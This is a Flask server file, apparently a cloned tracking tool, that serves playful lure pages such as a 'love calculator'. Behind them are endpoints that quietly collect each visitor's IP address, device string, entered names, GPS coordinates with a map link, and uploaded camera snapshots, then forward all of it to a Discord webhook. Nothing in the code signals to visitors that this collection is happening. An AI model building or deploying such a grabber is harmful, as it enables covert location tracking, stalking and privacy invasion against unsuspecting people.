from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import os
import uuid
import requests
from datetime import datetime
from dotenv import load_dotenv
import logging

load_dotenv()
app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
if not DISCORD_WEBHOOK:
    raise RuntimeError("Missing DISCORD_WEBHOOK")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route("/pookiee")
def pookiee():
    return render_template("pookiee.html")

@app.route("/lovecalculator")
def love_calculator_page():
    return render_template("lovecalculator.html")

@app.route("/log", methods=["POST"])
def log_love():
    data = request.get_json()
    your_name = data.get("yourName", "")
    crush_name = data.get("crushName", "")
    score = data.get("score", 0)
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")
    time_now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    msg = f"""💘 **Love Calculator Entry**
❤️ `{your_name}` + `{crush_name}` = `{score}%`
🌐 IP: `{user_ip}`
📱 Device: `{user_agent}`
🕒 Time: `{time_now}`
"""

    if DISCORD_WEBHOOK:
        try:
            requests.post(DISCORD_WEBHOOK, json={"content": msg})
        except Exception as e:
            print("❌ Failed to send to Discord:", e)
    else:
        print("⚠️ Webhook not found in .env")

    return jsonify({"status": "logged"}), 200

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/log-initial', methods=['POST'])
def log_initial():
    try:
        data = request.get_json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        # Validate location data
        lat = data.get('lat', 'Unknown')
        lon = data.get('lon', 'Unknown')

        message = {
            "content": (
                "📱 New Access\n"
                f"🌐 IP: {ip}\n"
                f"📍 Location: {lat}, {lon}\n"
                f"🗺️ Map: https://www.google.com/maps?q={lat},{lon}\n"
                f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"📱 Device: {request.user_agent}\n"
                "\n"
                "—\n"
                "🔧 Code built by @nottherealepic · cloned from GitHub\n"
                "💻 Repository: github.com/nottherealepic"
            )
        }

        requests.post(DISCORD_WEBHOOK, json=message)
        return jsonify({"status": "success"}), 200

    except Exception as e:
        logger.error(f"Log error: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    try:
        if 'photo' not in request.files:
            return jsonify({"error": "No photo"}), 400

        photo = request.files['photo']
        filename = f"snap-{datetime.now().strftime('%Y%m%d-%H%M%S')}.jpg"

        # Reset file stream position
        photo.stream.seek(0)

        files = {'file': (filename, photo.stream, 'image/jpeg')}
        response = requests.post(DISCORD_WEBHOOK, files=files)
        response.raise_for_status()

        return jsonify({"status": "success"}), 200

    except Exception as e:
        logger.error(f"Upload error: {str(e)}")
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
